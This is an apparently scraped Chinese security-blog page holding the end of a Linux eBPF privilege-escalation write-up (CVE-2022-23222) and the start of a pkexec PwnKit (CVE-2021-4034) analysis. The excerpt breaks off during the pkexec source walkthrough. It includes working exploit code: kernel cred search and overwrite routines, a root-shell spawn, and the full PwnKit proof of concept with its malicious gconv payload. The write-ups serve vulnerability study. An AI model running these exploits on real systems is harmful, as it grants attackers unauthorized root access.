<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spawn_processes</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PROC_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">pid_t</span> child = fork();</span><br><span class="line">        <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not set name"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">uid_t</span> old = getuid();</span><br><span class="line">            kill(getpid(), SIGSTOP);</span><br><span class="line">            <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">            <span class="keyword">if</span> (uid == <span class="number">0</span> &amp;&amp; old != uid) &#123;</span><br><span class="line">                OKF(<span class="string">"Enjoy root!"</span>);</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(uid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (child &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> child;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;processes[i] = child;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后，各进程依次尝试通过任意读原语，在 array 指针之后 PAGE_SIZE * PAGE_SIZE 大小的内核空间搜索 SCSLSCSL 字符串，来定位进程的 cred 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_cred</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE*PAGE_SIZE ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        u64 val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">kaddr_t</span> addr = ctx-&gt;array_map + PAGE_SIZE + i*<span class="number">0x8</span>;</span><br><span class="line">        <span class="keyword">if</span> (arbitrary_read(ctx, addr, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">            WARNF(<span class="string">"Could not read kernel address %p"</span>, addr);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// DEBUGF("addr %p = 0x%016x", addr, val);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;val, __ID__, <span class="keyword">sizeof</span>(val)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">kaddr_t</span> cred_from_task = addr - <span class="number">0x10</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (arbitrary_read(ctx, cred_from_task + <span class="number">8</span>, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not read kernel address %p + 8"</span>, cred_from_task);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (val == <span class="number">0</span> &amp;&amp; arbitrary_read(ctx, cred_from_task, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not read kernel address %p + 0"</span>, cred_from_task);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (val != <span class="number">0</span>) &#123;</span><br><span class="line">                ctx-&gt;cred = (<span class="keyword">kaddr_t</span>)val;</span><br><span class="line">                DEBUGF(<span class="string">"task struct ~ %p"</span>, cred_from_task);</span><br><span class="line">                DEBUGF(<span class="string">"cred @ %p"</span>, ctx-&gt;cred);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-5-实现提权"><a href="#4-5-实现提权" class="headerlink" title="4.5 实现提权"></a>4.5 实现提权</h3><p>定位到进程 cred 后，即可通过任意写原语修改 cred ，实现提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overwrite_cred</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_uid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_gid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_euid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_egid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt" target="_blank" rel="noopener">cve-2022-23222-linux-kernel-ebpf-lpe.txt</a></p>
<p><a href="https://www.pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/" target="_blank" rel="noopener">The Good, Bad and Compromisable Aspects of Linux eBPF - Pentera</a></p>
<p><a href="https://ebpf.io/" target="_blank" rel="noopener">eBPF - Introduction, Tutorials &amp; Community Resources</a></p>
<p><a href="https://www.kernel.org/doc/html/latest/bpf/instruction-set.html" target="_blank" rel="noopener">eBPF Instruction Set — The Linux Kernel documentation</a></p>
<p><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/" target="_blank" rel="noopener">BPF 进阶笔记（一）：BPF 程序（BPF Prog）类型详解：使用场景、函数签名、执行位置及程序示例</a></p>
<p><a href="https://man7.org/linux/man-pages/man7/bpf-helpers.7.html" target="_blank" rel="noopener">bpf-helpers(7) - Linux manual page</a></p>
<p><a href="https://www.containiq.com/post/libbpf" target="_blank" rel="noopener">Libbpf: A Beginners Guide</a></p>
<p><a href="https://nakryiko.com/posts/libbpf-bootstrap/" target="_blank" rel="noopener">Building BPF applications with libbpf-bootstrap</a></p>
<p><a href="https://nakryiko.com/posts/bpf-ringbuf/" target="_blank" rel="noopener">BPF ring buffer</a></p>
<p><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md" target="_blank" rel="noopener">bcc/reference_guide.md at master · iovisor/bcc</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2022/07/04/CVE-2022-23222/" data-id="cmd5slr2i000k0lo1de7s4e8o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2022/02/10/CVE-2021-4034" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2022/02/10/CVE-2021-4034/" class="article-date">
  <time datetime="2022-02-14T14:00:00.000Z" itemprop="datePublished">2022-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-作者"><a href="#0x00-作者" class="headerlink" title="0x00 作者"></a>0x00 作者</h2><p>钱程 of <a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener">IceSword Lab</a> </p>
<h2 id="0x01-漏洞基本信息"><a href="#0x01-漏洞基本信息" class="headerlink" title="0x01 漏洞基本信息"></a>0x01 漏洞基本信息</h2><p>polkit 的 pkexec 程序中存在一个本地权限提升漏洞。当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限  </p>
<h3 id="软件简介"><a href="#软件简介" class="headerlink" title="软件简介"></a>软件简介</h3><p><a href="https://gitlab.freedesktop.org/polkit/polkit/" target="_blank" rel="noopener">polkit</a> 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。</p>
<p>Polkit 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p>
<p>Polkit 定义出一系列操作，例如运行 GParted, 并将用户按照群组或用户名进行划分，例如 wheel 群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p>
<blockquote>
<p>https://wiki.archlinux.org/title/Polkit_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</p>
</blockquote>
<h3 id="漏洞原理概括"><a href="#漏洞原理概括" class="headerlink" title="漏洞原理概括"></a>漏洞原理概括</h3><p>当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>pkexec 是 polkit 的一个程序，可以以其他用户身份执行命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜ pkexec --<span class="built_in">help</span></span><br><span class="line">pkexec --version |</span><br><span class="line">       --<span class="built_in">help</span> |</span><br><span class="line">       --<span class="built_in">disable</span>-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class="line"></span><br><span class="line">See the pkexec manual page <span class="keyword">for</span> more details.</span><br></pre></td></tr></table></figure>
<p>不指定 <code>--user</code> 参数时，缺省为 <code>root</code>。比如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkexec reboot</span><br></pre></td></tr></table></figure>
<p><a href="https://imgtu.com/i/7X2MRK" target="_blank" rel="noopener"><img src="https://s4.ax1x.com/2022/01/27/7X2MRK.png" alt="7X2MRK.png"></a></p>
<h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>环境没有特殊要求，主流 Linux 发行版都可以。</p>
<p>本次测试的环境：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜ uname -a</span><br><span class="line">Linux ubuntu 5.11.0-46-generic <span class="comment">#51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">~ </span><br><span class="line">➜ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 20.04.3 LTS</span><br><span class="line">Release:	20.04</span><br><span class="line">Codename:	focal</span><br><span class="line">➜ gcc --version</span><br><span class="line">gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0</span><br><span class="line">Copyright (C) 2019 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">➜ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>对该漏洞的分析将结合已知的 <a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener">POC</a> 和 Qualys 的<a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener">报告</a>进行。</p>
<h3 id="分析-POC"><a href="#分析-POC" class="headerlink" title="分析 POC"></a>分析 POC</h3><p>先来分析 POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="keyword">char</span> *shell =</span><br><span class="line"> <span class="number">6</span>         <span class="string">"#include &lt;stdio.h&gt;\n"</span></span><br><span class="line"> <span class="number">7</span>         <span class="string">"#include &lt;stdlib.h&gt;\n"</span></span><br><span class="line"> <span class="number">8</span>         <span class="string">"#include &lt;unistd.h&gt;\n\n"</span></span><br><span class="line"> <span class="number">9</span>         <span class="string">"void gconv() &#123;&#125;\n"</span></span><br><span class="line"><span class="number">10</span>         <span class="string">"void gconv_init() &#123;\n"</span></span><br><span class="line"><span class="number">11</span>         <span class="string">"       setuid(0); setgid(0);\n"</span></span><br><span class="line"><span class="number">12</span>         <span class="string">"       seteuid(0); setegid(0);\n"</span></span><br><span class="line"><span class="number">13</span>         <span class="string">"       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"</span></span><br><span class="line"><span class="number">14</span>         <span class="string">"       exit(0);\n"</span></span><br><span class="line"><span class="number">15</span>         <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="number">16</span>         </span><br><span class="line"><span class="number">17</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="number">18</span>         FILE *fp;</span><br><span class="line"><span class="number">19</span>         system(<span class="string">"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"</span>);</span><br><span class="line"><span class="number">20</span>         system(<span class="string">"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules"</span>);</span><br><span class="line"><span class="number">21</span>         fp = fopen(<span class="string">"pwnkit/pwnkit.c"</span>, <span class="string">"w"</span>);</span><br><span class="line"><span class="number">22</span>         <span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, shell);</span><br><span class="line"><span class="number">23</span>         fclose(fp); </span><br><span class="line"><span class="number">24</span>         system(<span class="string">"gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"</span>);</span><br><span class="line"><span class="number">25</span>         <span class="keyword">char</span> *env[] = &#123; <span class="string">"pwnkit"</span>, <span class="string">"PATH=GCONV_PATH=."</span>, <span class="string">"CHARSET=PWNKIT"</span>, <span class="string">"SHELL=pwnkit"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="number">26</span>         execve(<span class="string">"/usr/bin/pkexec"</span>, (<span class="keyword">char</span>*[])&#123;<span class="literal">NULL</span>&#125;, env);</span><br><span class="line"><span class="number">27</span> &#125;</span><br></pre></td></tr></table></figure>
<p>在该 POC 中：  </p>
<ol>
<li>L5-L15，即 payload，引入了一个 root 权限的 <code>/bin/sh</code></li>
<li>L19，创建目录 <code>GCONV_PATH=.</code>，创建文件 <code>GCONV_PATH=./pwnkit</code> 并添加了执行权限</li>
<li>L20，创建目录 <code>pwnkit</code>，创建文件 <code>pwnkit/gconv-modules</code> 并写入内容 <code>module UTF-8// PWNKIT// pwnkit 2</code></li>
<li>L21-L24，把 payload 写入 <code>pwnkit/pwnkit.c</code> 并编译为动态链接库 <code>pwnkit/pwnkit.so</code></li>
<li>L25，一个特殊的数组</li>
<li>L26，使用 <code>execve</code> 调用 <code>pkexec</code>，这里有个特别的参数 <code>(char*[]){NULL}</code>，这也是整个 POC 的<strong>启动点</strong></li>
</ol>
<p>测试一下 POC：</p>
<p><a href="https://imgtu.com/i/7X2QxO" target="_blank" rel="noopener"><img src="https://s4.ax1x.com/2022/01/27/7X2QxO.png" alt="7X2QxO.png"></a></p>
<h3 id="奇妙的-argc-为-0"><a href="#奇妙的-argc-为-0" class="headerlink" title="奇妙的 argc 为 0"></a>奇妙的 argc 为 0</h3><p>argc 和 argv 大家都熟悉，为了后面的分析这里再介绍一下：</p>
<ul>
<li>argc：即 argument count，保存运行时传递给 main 函数的参数个数。</li>
<li>argv：即 argument vector，保存运行时传递 main 函数的参数，类型是一个字符指针数组，每个元素是一个字符指针，指向一个命令行参数。<br>例如：</li>
<li>argv[0] 指向程序运行时的全路径名；</li>
<li>argv[1] 指向程序在命令行中执行程序名后的第一个字符串</li>
</ul>
<p>下面的代码就展示了 argc 和 argv 用法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//t.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"argc:%d\n"</span>,argc);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=argc;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"argv[%d]:%s\n"</span>,i,argv[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">➜ gcc t.c -o t</span><br><span class="line">~/t2 </span><br><span class="line">➜ ./t</span><br><span class="line">argc:<span class="number">1</span></span><br><span class="line">argv[<span class="number">0</span>]:./t</span><br><span class="line">argv[<span class="number">1</span>]:(null)</span><br><span class="line">~/t2 </span><br><span class="line">➜ ./t -l</span><br><span class="line">argc:<span class="number">2</span></span><br><span class="line">argv[<span class="number">0</span>]:./t</span><br><span class="line">argv[<span class="number">1</span>]:-l</span><br><span class="line">argv[<span class="number">2</span>]:(null)</span><br></pre></td></tr></table></figure>
<h4 id="execve"><a href="#execve" class="headerlink" title="execve()"></a>execve()</h4><p><a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="noopener">execve()</a> 可以执行程序，使用该函数需要引入 <code>unistd.h</code> 头文件，函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">char</span> *<span class="keyword">const</span> argv[],</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
<p>我们使用前面的 <code>t.c</code> 来熟悉一下 <code>execve()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ex.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *args[]=&#123;<span class="string">"./t"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *enp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">"./t"</span>,args,enp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">➜ vim ex.c</span><br><span class="line">~/t2 took <span class="number">24</span>s </span><br><span class="line">➜ gcc ex.c -o ex</span><br><span class="line">~/t2 </span><br><span class="line">➜ ./ex </span><br><span class="line">argc:<span class="number">2</span></span><br><span class="line">argv[<span class="number">0</span>]:./t</span><br><span class="line">argv[<span class="number">1</span>]:-l</span><br><span class="line">argv[<span class="number">2</span>]:(null)</span><br></pre></td></tr></table></figure>
<p>前面 POC 中 L26，使用了 <code>execve()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span>         <span class="keyword">char</span> *env[] = &#123; <span class="string">"pwnkit"</span>, <span class="string">"PATH=GCONV_PATH=."</span>, <span class="string">"CHARSET=PWNKIT"</span>, <span class="string">"SHELL=pwnkit"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="number">26</span>         execve(<span class="string">"/usr/bin/pkexec"</span>, (<span class="keyword">char</span>*[])&#123;<span class="literal">NULL</span>&#125;, env);</span><br></pre></td></tr></table></figure>
<p>但是参数使用方法和我们测试的不同，<strong>第二个参数使用了 <code>(char*[]){NULL}</code> 进行填充</strong>。我们来测试一下这样会有什么结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ex.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="comment">//char *args[]=&#123;"./t","-l",NULL&#125;;</span></span><br><span class="line">    <span class="keyword">char</span> *enp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">"./t"</span>,(<span class="keyword">char</span>*[])&#123;<span class="literal">NULL</span>&#125;,enp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~/t2 </span><br><span class="line">➜ vim ex.c</span><br><span class="line">~/t2 took <span class="number">31</span>s </span><br><span class="line">➜ gcc ex.c -o ex</span><br><span class="line">~/t2 </span><br><span class="line">➜ ./ex </span><br><span class="line">argc:<span class="number">0</span></span><br><span class="line">argv[<span class="number">0</span>]:(null)</span><br></pre></td></tr></table></figure>
<p>此时我们发现 argc 为 0，且 argv[0] 内容为空，不再是程序本身。这有什么用呢？用处很大。</p>
<h3 id="pkexec-中的越界读取"><a href="#pkexec-中的越界读取" class="headerlink" title="pkexec 中的越界读取"></a>pkexec 中的越界读取</h3><p>现在来分析 pkexec 的代码，其 main() 函数主要结构如下：</p>
